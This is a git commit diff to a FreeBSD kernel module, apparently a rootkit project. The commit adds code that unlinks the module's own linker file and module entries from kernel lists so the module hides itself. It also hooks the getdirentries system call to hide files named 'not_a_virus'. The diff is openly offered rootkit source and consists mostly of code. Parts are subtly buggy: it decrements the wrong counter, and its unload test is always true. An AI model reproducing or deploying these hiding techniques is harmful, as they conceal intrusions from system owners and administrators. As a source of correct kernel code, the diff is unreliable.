7523eaddb4421b8bac1b6b5fb3e08999534f555c
Callum Jones <emailcallumj@gmail.com>
2021-04-11 08:59:31 +1000

    Finished hiding the kit from the kernel itself.

--- src/basic_function_hooking.c
+++ src/basic_function_hooking.c
@@ -9,8 +9,44 @@
 #include <sys/sysproto.h>
 #include <sys/dirent.h>
 
+// Includes for the DKOM
+#include <sys/linker.h>
+#include <sys/lock.h>
+#include <sys/mutex.h>
+#include <sys/sx.h>
+
+#include <vm/vm.h>
+#include <vm/vm_page.h>
+#include <vm/vm_map.h>
+
 #define TARGET_NAME "not_a_virus"
 #define LENGTH 11
+#define VERSION "hook.ko"
+
+
+/*
+ * These are the vars we will need to hide this module from the kernel
+ * itself. They are not defined in any of our headers, so we need
+ * to set up some references here so we can actually modify them.
+*/
+extern linker_file_list_t linker_files;
+extern struct sx kld_sx;
+extern int next_file_id;
+typedef TAILQ_HEAD(, module) modulelist_t;
+extern modulelist_t modules;
+extern int nextid;
+struct module {
+	TAILQ_ENTRY(module)    link; // Chain together all modules
+	TAILQ_ENTRY(module)    flink; // All modules in a file.
+	struct linker_file     *file; // file which contains this module
+	int 		       refs; // Reference  count
+	int 		       id; // Unique id number
+	char 		       *name; // Module name
+	modeventhand_t	       handler; // Event handler
+	void		       *arg;
+	modspecific_t	       data; // Module specific data.
+};
+
 
 // System call hook function
 //
@@ -78,7 +114,7 @@ static int dir_hook (struct thread *td, void *syscall_args) {
 				curr = (struct dirent *) ((char *)curr + len);
 			}
 		}
-		
+
 //		uprintf("6\n");
 
 
@@ -99,24 +135,56 @@ static int load (struct module *module, int cmd, void *arg) {
 
 	int err = 0;
 
-	switch(cmd) {
-	case MOD_LOAD:
-		uprintf("Loaded module\n");
+	if (cmd ==  MOD_LOAD) {
+		struct linker_file *lf;
+		struct module *mod;
+
+		mtx_lock(&Giant);
+		sx_xlock(&kld_sx);
+
+		// Decrease curr kernels ref count by 1
+		(&linker_files)->tqh_first->refs--;
+
+		/*
+		 * Go thru linker_files list. If we find ours, remove it
+		 * from the list and decrement next_file_id.
+		*/
+
+		TAILQ_FOREACH(lf, &linker_files, link) {
+			if (strncmp(lf->filename, VERSION, LENGTH) == 0) {
+				nextid--;
+				TAILQ_REMOVE(&linker_files, lf, link);
+				break;
+			}
+		}
+
+		sx_xunlock(&kld_sx);
+		mtx_unlock(&Giant);
+
+		sx_xlock(&modules_sx);
+
+		TAILQ_FOREACH(mod, &modules, link) {
+			if (strcmp(mod->name, "hider") == 0) {
+				nextid--;
+				TAILQ_REMOVE(&modules, mod, link);
+				break;
+			}
+		}
+
+		sx_xunlock(&modules_sx);
+
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)dir_hook;
-		break;
-	case MOD_UNLOAD:
+	} else if (MOD_UNLOAD) {
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
-		break;
-	default:
+	} else {
 		err = EOPNOTSUPP;
-		break;
 	}
 
 	return (err);
 }
 
 static moduledata_t read_hook_mod = {
-	"read_hook",		// Module name
+	"hider",		// Module name
 	load,			// event handler
 	NULL			// Extra data
 };
